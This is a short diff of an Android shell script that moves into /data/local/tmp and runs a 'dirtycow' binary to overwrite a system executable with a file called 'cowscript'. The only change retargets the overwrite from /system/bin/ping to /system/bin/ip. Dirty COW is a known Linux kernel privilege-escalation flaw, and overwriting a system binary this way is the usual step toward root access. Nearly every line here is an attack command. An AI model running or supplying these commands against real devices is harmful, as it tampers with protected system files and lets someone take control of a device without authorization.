@@ -2,4 +2,4 @@
 
 cd ../../../../../../../
 cd /data/local/tmp/
-./dirtycow /system/bin/ping /data/local/tmp/cowscript
+./dirtycow /system/bin/ip /data/local/tmp/cowscript
